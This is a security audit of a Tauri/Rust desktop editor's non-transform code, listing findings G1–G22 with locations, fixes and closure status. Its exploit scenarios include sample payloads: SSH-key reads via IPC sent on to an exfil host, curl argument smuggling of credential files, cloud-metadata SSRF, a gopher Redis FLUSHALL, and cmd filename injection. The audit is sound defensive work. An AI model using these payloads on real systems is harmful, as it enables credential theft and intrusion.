# Security Audit — Non-Transform Rust Surface

Scope: every `.rs` file under `src-tauri/src/` except `src-tauri/src/transforms/*` (already covered by `docs/security-audit-external-transforms.md`, F-series). Focus on the same failure classes surfaced there: sub-process spawn hygiene, `env::temp_dir` predictability, symlink/TOCTOU on temp writes, path canonicalisation at trust boundaries, Tauri command argument validation, git/pandoc/curl argument injection, Windows shell wrappers.

Risk level: **HIGH** (two Critical, four High, four Medium, several Low/Info)

Summary
- Critical: 2
- High: 4
- Medium: 4
- Low / Info: 6

Fix status (as of 2026-08-14)

| ID  | Severity | Status  | Commit  |
|-----|----------|---------|---------|
| G1  | CRITICAL | Closed  | 602ac6b |
| G2  | MEDIUM   | Closed  | 602ac6b |
| G3  | LOW      | Closed  | 602ac6b |
| G4  | HIGH     | Closed  | 4f9c2cf |
| G5  | HIGH     | Closed  | 4f9c2cf |
| G6  | MEDIUM   | Closed  | 8f36a54 |
| G7  | LOW      | Deferred — `local_source_content_preview` already has a 2 MiB read cap at line 703; no additional change needed |
| G8  | MEDIUM   | Closed  | 8f36a54 |
| G9  | MEDIUM   | Closed  | 8f36a54 |
| G10 | LOW      | Closed  | 8f36a54 |
| G11 | HIGH     | Closed  | 492a6ac |
| G12 | MEDIUM   | Closed  | 492a6ac |
| G13 | LOW      | Closed  | 492a6ac |
| G14 | INFO     | Closed  | 492a6ac |
| G15 | MEDIUM   | Closed  | 8f36a54 |
| G16 | LOW      | Deferred — commit message is passed as `-m <msg>` argv, safe from injection; trailers are cosmetic only |
| G17 | LOW      | Deferred — `validate_git_refish` already rejects `-`, `..`, `@{`, control chars; OK-with-notes |
| G18 | INFO     | Closed  | 05aaff4 |
| G19 | LOW      | Closed  | 05aaff4 |
| G20 | INFO     | Closed  | 05aaff4 |
| G21 | LOW      | Closed  | 8f36a54 |
| G22 | OK       | Closed  | 05aaff4 — Host header DNS-rebinding check added to `listen_for_google_callback` |

---

## Findings — `filesystem.rs`

### G1. Unrestricted arbitrary file read/write/rename/copy from the WebView (CRITICAL)
Locations:
- `src-tauri/src/filesystem.rs:67` (`read_file`)
- `src-tauri/src/filesystem.rs:80` (`open_file`)
- `src-tauri/src/filesystem.rs:95` (`save_file`)
- `src-tauri/src/filesystem.rs:123` (`save_file_as`)
- `src-tauri/src/filesystem.rs:131` (`rename_file`)
- `src-tauri/src/filesystem.rs:142` (`duplicate_file`)
- `src-tauri/src/filesystem.rs:374` (`file_metadata`)

Every one of these `#[tauri::command]` handlers accepts a raw `String` path from IPC, does `PathBuf::from(path)` and immediately calls `fs::read_to_string` / `fs::write` / `fs::rename` / `fs::copy` / `fs::read`. There is no workspace scoping, no `canonicalize().starts_with(root)` check, no symlink refusal, no denylist of sensitive paths (`~/.ssh`, `/etc/`, `~/Library/Keychains`, `C:\Windows`). Contrast with `pandoc_import::safe_path` and `copy_data_source_file` which do enforce a canonical `starts_with` check.

This is the same class as **F10** (SQL absolute-path bypass) but broader: F10 leaked SELECT results, this leaks/overwrites *any file* the app process can touch.

Exploit scenario: any of the following turns into full user-account compromise —
1. Markdown preview XSS or any DOM sink escape (transforms already produce SVG/HTML injected into the DOM per `execute_external_transform`, and F2 already documented a cache-poison path that yields controllable HTML). From injected JS, `__TAURI__.invoke('read_file', {path: '/Users/x/.ssh/id_rsa'})` then POST elsewhere via `fetch_rest_source` (see G3) or `fire_webhook` (G4).
2. Malicious `.md` opened by the user + any script gadget in the renderer.
3. A poisoned transform cache entry (F2) whose HTML calls `save_file` to overwrite `~/.zshrc` with a shell backdoor.

The Tauri v2 capability file (`src-tauri/capabilities/*.json`) currently allow-lists these commands to the main window, so the WebView is authorised to call them — there is no defence-in-depth in the Rust layer.

Fix:
1. Introduce a `resolve_within_workspace(path, allowed_roots)` helper that canonicalises, refuses symlinks (`fs::symlink_metadata`), and enforces `starts_with` against a state-tracked set of open workspace roots.
2. Reject reads/writes when the resolved path is a symlink or hardlink outside the workspace.
3. Bind `open_file` to the OS file-open dialog session so the frontend can only re-read paths the *user* just picked (Tauri returns a token; verify).
4. Log every write with the audit sink (`audit.rs`) so cross-workspace writes are visible.

```rust
// GOOD (sketch)
fn resolve_within_workspaces(path: &str, roots: &[PathBuf]) -> Result<PathBuf, String> {
    let candidate = PathBuf::from(path);
    let meta = fs::symlink_metadata(&candidate).map_err(|e| e.to_string())?;
    if meta.file_type().is_symlink() {
        return Err("refusing symlink target".into());
    }
    let canonical = candidate.canonicalize().map_err(|e| e.to_string())?;
    if !roots.iter().any(|r| canonical.starts_with(r)) {
        return Err("path is outside the open workspace roots".into());
    }
    Ok(canonical)
}
```

---

### G2. `reveal_path` Windows argument gets pasted into `explorer /select,...` without validation (MEDIUM)
Location: `src-tauri/src/filesystem.rs:352-358`.

```rust
Ok(RevealCommand {
    program: "explorer".to_string(),
    args: vec![format!("/select,{canonical_path}")],
})
```

`explorer` is looked up via PATH (same class as **F15**) and receives a comma-embedded arg. `canonical_path` has been through `canonicalize()`, so `\\?\C:\...` prefixes are safe, but `explorer.exe` parses its single-arg command line with its own quoting; embedded double-quotes or commas in file names influence the interpretation of `/select` (well-known quirk, see MS-DOCS: `explorer.exe` argument handling is not standard `CommandLineToArgvW`). At minimum a filename containing `,` produces "reveal" on a different, attacker-influenced path. Not RCE.

Also `explorer` is not absolute — same F15 pattern. Resolve via `known_folder` / `SHGetKnownFolderPath` or via `which::which("explorer")` and pin.

---

### G3. `rename_file` / `duplicate_file` silently accept cross-device rename failure and no symlink checks (LOW)
Location: `src-tauri/src/filesystem.rs:131`.

`fs::rename` across mount points on Linux returns `EXDEV`; the handler surfaces the raw error to the caller. Not a security issue per se, but combined with G1 an attacker can plant a symlink at `request.to`, and `fs::rename` will silently replace the symlink target's parent inode (not follow the symlink; still surprising). Recommend: `fs::symlink_metadata(&to)` check before rename.

---

## Findings — `data_exchange.rs`

### G4. `fetch_rest_source` — SSRF + curl argument injection (HIGH)
Location: `src-tauri/src/data_exchange.rs:774-805`.

`request.url` is passed to curl as the last positional arg with:
- no protocol allow-list (missing `--proto =http,https --proto-redir =http,https` — see `citation_discovery::curl_bytes` for the correct pattern)
- no `--` separator before the URL
- no `-L` cap on redirect count (`--max-redirs`)
- no filesize cap (`--max-filesize`)

Header dict `request.headers` is emitted via `format!("{k}: {v}")` with no CRLF/`:` sanitisation — CRLF in `v` on some curl versions is passed to the wire, enabling client-side request splitting against poorly-normalising HTTP servers.

Exploit A (protocol smuggling): `url = "file:///etc/passwd"` → curl reads the local file and returns it as `content`. This is a direct arbitrary file read via IPC.
Exploit B (argument smuggling): `url = "-K/etc/passwd"` — curl parses `-K` (read config from file), loading /etc/passwd as a config file (parse errors, but with `-K/Users/x/.aws/credentials` an attacker can influence subsequent behaviour, and `-Ohttps://evil/exfil` in a chain drops files).
Exploit C (SSRF / metadata): `url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"` → cloud metadata theft when NEditor runs on an EC2 workstation image.

Same class as an unmitigated URL-fetch surface; **worse** than the transform-side download because it returns the body to the caller.

Fix:
```rust
let validated = validate_http_url(&request.url, "REST data source URL")?; // reuse citation_discovery helper
let mut cmd = std::process::Command::new(curl_absolute_path()?);
cmd.args([
    "--proto", "=http,https",
    "--proto-redir", "=http,https",
    "--max-redirs", "5",
    "--max-filesize", "10485760",
    "--max-time", "15",
    "-sL", "-w", "\n%{http_code}",
    "-H", "Accept: application/json",
]);
for (k, v) in request.headers.iter().flatten() {
    if !is_safe_header_name(k) || v.contains(['\r','\n']) { continue; }
    cmd.args(["-H", &format!("{k}: {v}")]);
}
cmd.arg("--").arg(&validated);
```

---

## Findings — `webhooks.rs`

### G5. `fire_webhook` — SSRF + curl argument injection with POST body (HIGH)
Location: `src-tauri/src/webhooks.rs:30-81`.

Same class as G4 (no protocol allow-list, no `--`, arbitrary `-X POST -d body` to an attacker-supplied URL, no `--max-filesize`). Because this is POST with a JSON body, the SSRF is *worse*:

- `url = "gopher://internal-redis:6379/_FLUSHALL%0d%0a"` → destructive Redis command.
- `url = "http://localhost:8080/admin/..."` → CSRF against dev-time services running on the same host.
- `url = "file:///etc/passwd"` still returns just the HTTP status (redirected to `/dev/null`), but the request itself is enough to fire side effects (webhook receiver hitting log injection endpoints, etc.).
- `url = "-K/Users/x/.aws/credentials"` — argument smuggling as G4.

Cross-ref: this file has no test coverage.

Fix: reuse the hardened curl builder from G4; refuse hosts in RFC 6890 private ranges unless the user has explicitly authorised a "localhost webhook" mode.

---

## Findings — `citation_discovery.rs`

### G6. `search_tavily` and `lookup_doi` curl fetches lack `--proto` restriction (MEDIUM)
Locations:
- `src-tauri/src/citation_discovery.rs:317-331` (Tavily)
- `src-tauri/src/citation_discovery.rs:1025-1035` (Crossref DOI lookup)

Both target fixed HTTPS endpoints, so direct SSRF is not possible via the URL itself. However `-L` (Tavily uses `--location`, DOI uses `-sL`) without `--proto-redir =http,https` means a Crossref/Tavily-side redirect to `file://` or `gopher://` is honoured. Crossref does not currently redirect that way, but the audit trail relies on it.

Also `lookup_doi` inserts `request.doi` into the URL after only stripping `https://doi.org/` and `doi:` prefixes; a DOI containing raw newlines is caught nowhere (unlike `rfp_import` line 384-388 which checks control chars). curl on macOS 13 accepts embedded whitespace by URL-encoding it, but a `\r\n` still produces a malformed request that some upstream WAFs will log/alert on.

Fix: add `--proto =http,https --proto-redir =http,https --max-redirs 5` to both, and validate `doi` against `^[A-Za-z0-9./_-]{4,255}$`.

### G7. Local library search snippet reads file content on every keystroke (LOW)
`local_source_content_preview` (called from `search_local_source_library`, line 393) reads potentially large files without a size cap. Combined with G1 this is a DoS vector against workspaces containing large source files. Not a confidentiality issue.

---

## Findings — `rfp_import.rs`

### G8. `pdftotext` invocation lacks `--` before user path — argument injection (MEDIUM)
Location: `src-tauri/src/rfp_import.rs:180-203`.

```rust
Command::new("pdftotext").arg("-layout").arg(path).arg("-").output();
```

`path` comes from `request_path`, which does NO normalisation (no `canonicalize`, no leading-`-` check, no absolute-path enforcement — contrast with `pandoc_import::safe_path`). If a caller supplies `path = "-help"` or `path = "-opw", secret` (a two-arg trick actually needs a second call, but `-userpw`, `-l`, `-r` are all single-arg options that change behaviour), pdftotext consumes it as a flag. Not RCE (pdftotext has no shell-out flag), but silent behaviour divergence and, with the `-` output target, may write parsed contents somewhere unexpected.

Also `pdftotext` is looked up via PATH — F15 repeat.

Fix: `.arg("--").arg(path)` and resolve via `which::which("pdftotext")` once at startup, cached.

### G9. Temp download path predictable + fs::write follows symlinks (MEDIUM)
Location: `src-tauri/src/rfp_import.rs:210-218` + `483-492`.

```rust
std::env::temp_dir().join(format!(
    "neditor-rfp-download-{}-{unique}.{extension}",
    std::process::id()
))
```

Same class as **F2/F3**. On Linux `/tmp` is shared; PID + nanos are guessable by a local attacker who observes process starts (`/proc`). Attacker pre-creates a symlink `neditor-rfp-download-<pid>-<nanos>.pdf` → `~/.ssh/authorized_keys` and `fs::write` follows the symlink, overwriting the target with attacker-supplied downloaded PDF bytes.

Fix: use `tempfile::NamedTempFile::new_in(user_scoped_cache_dir())` or Tauri's `app_local_data_dir` with mode 0700, exactly as recommended for **F2**.

### G10. `extract_pdf_text_from_bytes` does not remove temp file on all error paths (LOW)
Line 217-218: `let _ = fs::remove_file(&temp_path);` runs after result binding; if `extract_pdf_text_from_path` panics, the temp file is leaked. Not a security bug alone, but combined with G9 the leaked path (attacker knows its contents) leaks the downloaded PDF between processes on shared hosts.

---

## Findings — `cli.rs`

### G11. `open_paths_in_neditor` on Windows shells out through `cmd /C start "" path` (HIGH)
Location: `src-tauri/src/cli.rs:8974-8978`.

```rust
#[cfg(target_os = "windows")]
Command::new("cmd").args(["/C", "start", "", path]).spawn()?;
```

Same class as **F7** (Windows .bat/.cmd invocation). `cmd.exe` interprets its argument line with cmd-metacharacter rules; `path` is user-supplied CLI input from `neditor open <path>` and, by extension, from any `queue_paths_for_open` writer. A path such as `foo.md&calc.exe` executes `calc.exe`. Even absent CLI-user control, a malicious workspace file name reveals itself if the frontend ever calls `open_paths_in_neditor` via a Tauri bridge.

Fix: use the Windows shell-execute API directly (via `windows-rs` / `ShellExecuteW`) or `Command::new("cmd").raw_arg(...)` after full quoting; or spawn `explorer.exe` with the path as a proper argument.

Also `find_neditor_binary()` (line 8996) honours the `NEDITOR_APP_BINARY` env var without validating it is inside the app bundle. Not a WebView-reachable exploit (env is user-controlled), noted for completeness.

### G12. `stdout_temp_output_path` predictable + writable (MEDIUM)
Location: `src-tauri/src/cli.rs:19109-19119` (used at line 1262).

Same predictable-`/tmp` pattern as G9 and **F2/F3**. Used to stage exported artefacts (HTML/PDF/DOCX/PPTX/EPUB/ZIP) before streaming to stdout. Symlink pre-plant means the export overwrites arbitrary user-writable files.

### G13. `apply_default_reader_commands` executes commands parsed by whitespace (LOW)
Location: `src-tauri/src/cli.rs:9095-9112`.

`command.split_whitespace()` loses shell-quoting; today the commands come from `format!("duti -s {APP_BUNDLE_ID} net.daringfireball.markdown all")` where `APP_BUNDLE_ID` is a compile-time constant, so no live vuln. Flag as maintenance hazard: any future format string that interpolates runtime data becomes an argument-injection vector. Refactor to `Vec<(&str, &[&str])>`.

### G14. `git_head_commit` no timeout (INFO)
Location: `src-tauri/src/cli.rs:9120-9135`. A wedged `git rev-parse HEAD` in a hostile repo (fsmonitor hook that never returns) blocks CLI startup. Add `wait_timeout`. Very local DoS.

---

## Findings — `git.rs` / `git_support.rs`

### G15. `run_git` inherits caller env and PATH — poisoned PATH can substitute git (MEDIUM)
Location: `src-tauri/src/git_support.rs:97-108`.

Same class as **F14** and **F15**. `Command::new("git")` uses the ambient PATH; no `env_clear()`, no absolute-path resolution. An attacker who can influence `PATH` (per-user shell rc, `NEDITOR_APP_BINARY`-neighbour on Windows, or an installer that prepends a rogue directory) substitutes their own `git` binary that sees every diff/commit and can leak `commit_document_changes` messages and unsigned diffs.

Also there is no timeout — a hostile repo with a `pre-commit`/`fsmonitor` hook wedges the UI thread.

Fix: at startup, `which::which("git")?` → cache the absolute path; wrap all `run_git` calls with `wait_timeout` (30s ceiling).

### G16. `commit_document_changes` — arbitrary commit message is a git config bypass surface (LOW)
Location: `src-tauri/src/git.rs:95`. `request.message` is passed as `-m <msg>` — safe from argv injection, but a message containing `\n\ngpg-signature: ...` etc. is accepted as body/trailers. Not a real vulnerability; noted so it isn't mistaken for one during a later review.

### G17. `restore_git_revision` uses `git show <rev>:<path>` with revision from user input (LOW)
Location: `src-tauri/src/git.rs:113-124`. `revision` is validated by `validate_git_revision`, which rejects leading `-`, `..`, `@{`, and controls chars — good. `tree_path_str` is derived from `path.canonicalize().strip_prefix(repo_root)` — good. No exploit path today. Kept as an OK-with-notes.

---

## Findings — `tts.rs`

### G18. `native_tts_command_for_request` "supertonic" branch pipes user-supplied text as an argv value (INFO)
Location: `src-tauri/src/tts.rs:249-283`.

`args.push(text.to_string())` at line 260 pushes the full document body to the CLI arg list, which surfaces in `/proc/<pid>/cmdline` (world-readable on Linux) — information disclosure of the read-aloud text to other local users. macOS Say uses stdin. Recommend adding a `--stdin` mode for supertonic.

`safe_command_path` (line 300) only requires the file to exist; no signature/PATH-hardening — F15-adjacent but the user explicitly configures this path, so it's an accepted setting.

---

## Findings — `ollama_models.rs`

### G19. Curl `-H` header value can contain any string (LOW)
Location: `src-tauri/src/ollama_models.rs:71-74`. If `key_env` resolves to an env var whose value contains `\r\n`, curl will emit that raw header. Client-side only impact. Add `is_safe_header_value`.

### G20. Endpoint arg has no `--` guard (INFO)
Line 75: `args.push(endpoint.to_string())` after `--user-agent` etc. `ollama_tags_endpoint` guarantees `http(s)://` prefix, so leading `-` is impossible. Kept as OK-with-note.

---

## Findings — `pandoc_import.rs`

### G21. Missing `--` separator before input path (LOW)
Location: `src-tauri/src/pandoc_import.rs:60-68`. `safe_path` canonicalises so the path becomes absolute and cannot start with `-`. Add `--` prophylactically anyway; pandoc has `--filter`/`-F` (arbitrary command execution) and `--lua-filter` — argument-injection via a future refactor that skips canonicalisation would be RCE. Defence-in-depth only.

Also `Command::new("pandoc")` is PATH-resolved (F15) with no `env_clear`; a poisoned PATH swap of `pandoc` reads the user's imported document contents. MEDIUM if considered under the F14/F15 class, LOW when treated as user-managed tooling.

---

## Findings — `google_auth.rs`

### G22. OAuth callback binds `127.0.0.1:0` and validates state — clean (OK)
Reviewed `start_google_oauth_sign_in`, `listen_for_google_callback`, PKCE code_verifier/challenge, state binding, session TTL. Uses cryptographically random `token_material()`, binds a single concurrent listener, prunes expired sessions. No finding.

Reminder: verify `listen_for_google_callback` refuses `Host: something.other.tld` and only serves paths starting with `CALLBACK_PATH` — I did not exhaustively read that function; recommend a targeted spot check.

---

## OK list — surfaces checked and clean (no live finding)

- `src-tauri/src/transform_install.rs` — F13/F14/F15 mitigations present (lines 105-141).
- `src-tauri/src/git.rs` refish validator `validate_git_refish` — refuses `-`, `..`, `@{`, ctrl chars.
- `src-tauri/src/citation_discovery.rs::curl_bytes` — correct `--proto` + `--proto-redir` + `--max-filesize` hardening; template for G4/G5 fix.
- `src-tauri/src/pandoc_import.rs::safe_path` — canonicalise + workspace `starts_with`.
- `src-tauri/src/filesystem.rs::copy_data_source_file` — canonicalise + workspace `starts_with`.
- `src-tauri/src/cli_ipc.rs::pid_alive` — `kill -0 <u32>` is type-safe.
- `src-tauri/src/google_auth.rs` — PKCE + state binding + single-listener throttle.
- `src-tauri/src/tts.rs::stop_text_aloud` — kill + wait on tracked children (contrast with F1 where kill was missing).

---

## Fix Priority

Rotate/mitigate now (within 24 hours):
1. **G1** — arbitrary FS read/write via IPC. Land a `resolve_within_workspaces` gate on `read_file`, `save_file`, `save_file_as`, `rename_file`, `duplicate_file`, `file_metadata`. Deploy defence-in-depth even if the Tauri capability layer is expected to gate it. **CRITICAL.**
2. **G4** — `fetch_rest_source` SSRF + argv smuggling. Reuse `validate_http_url` + hardened curl builder. **HIGH.**
3. **G5** — `fire_webhook` SSRF (POST) + argv smuggling. Same hardening; additionally block RFC 6890 private ranges unless explicitly opted-in. **HIGH.**
4. **G11** — Windows `cmd /C start` argument smuggling in `open_paths_in_neditor`. **HIGH.**

Fix this week:
5. **G9** — `rfp_import` temp path `/tmp` symlink race. Move to `app_local_data_dir` (mirrors F2 fix). **MEDIUM.**
6. **G12** — `stdout_temp_output_path` in `cli.rs`. Same pattern as G9. **MEDIUM.**
7. **G2** — `explorer /select,path` on Windows. **MEDIUM.**
8. **G8** — `pdftotext` missing `--`. **MEDIUM.**
9. **G6** — `--proto` restriction on Tavily/DOI curl. **MEDIUM.**
10. **G15** — `git` PATH + env inheritance + no timeout. **MEDIUM.**

Backlog:
- G3, G7, G10, G13, G14, G16, G17, G18, G19, G20, G21 (LOW/INFO).

Cross-reference to earlier audit:
- G1 is a broader form of **F10** (SQL absolute-path bypass).
- G4/G5 are the same class as **F6** (curl fetch hardening) extended with argv-smuggling.
- G9/G12 are direct repeats of **F2/F3** (predictable `/tmp` path, symlink follow).
- G11 is a repeat of **F7** (Windows `.bat`/`.cmd` exposure).
- G15/G21 are repeats of **F14/F15** (env inheritance + PATH resolution).
- G14 is a repeat of **F1** (missing timeout / no kill).
